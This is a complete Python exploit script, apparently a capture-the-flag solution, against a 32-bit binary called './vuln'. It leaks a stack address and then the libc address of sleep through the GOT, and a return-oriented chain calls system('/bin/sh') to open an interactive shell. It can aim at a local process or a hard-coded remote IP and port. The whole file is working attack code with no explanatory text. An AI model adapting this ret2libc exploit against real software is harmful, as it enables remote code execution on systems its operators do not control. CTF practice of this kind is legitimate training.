#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './vuln'
context.log_level = 'INFO'
mode = args['MODE'].lower()
os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
libc = [x for x in elf.libs.keys() if 'libc.so' in x]
libc = ELF(libc and libc[0] or './libc.so.6')


def exploit():
    if mode == 'debug':
        io = debug(binary)
        io.b([
            # 0x080486D5,
            # 0x080487E2,
        ])
        io.r()
    elif mode == 'remote':
        io = remote('35.198.98.140', 45067)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def run_rop(rop):
        info('rop:\n%s', rop.dump())
        username = cyclic(40)
        io.sendafter('username:', username)
        io.recvuntil(username)
        main_ebp = u32(io.recvn(4))
        log.info('ebp in main: %#x', main_ebp)

        io.sendafter(':', -1)
        io.sendafter(':', fit({0x50: main_ebp + 8, 0x60: rop.chain()}))
        io.recvline_endswith('bye!')

    rop = ROP(elf)
    rop.printf(elf.got['sleep'])
    rop.call(elf.entry)
    run_rop(rop)

    sleep_address = u32(io.recvn(4))
    info('sleep address: %#x', sleep_address)
    libc.address = sleep_address - libc.symbols['sleep']
    info('libc address: %#x', libc.address)

    rop = ROP(elf)
    rop.call(libc.symbols['system'], [libc.search('/bin/sh').next()])
    run_rop(rop)

    if mode == 'debug':
        io.interrupt()
        io.sendlines('''
        #'''.strip().split('\n'))

    io.interactive()


if __name__ == '__main__':
    exploit()
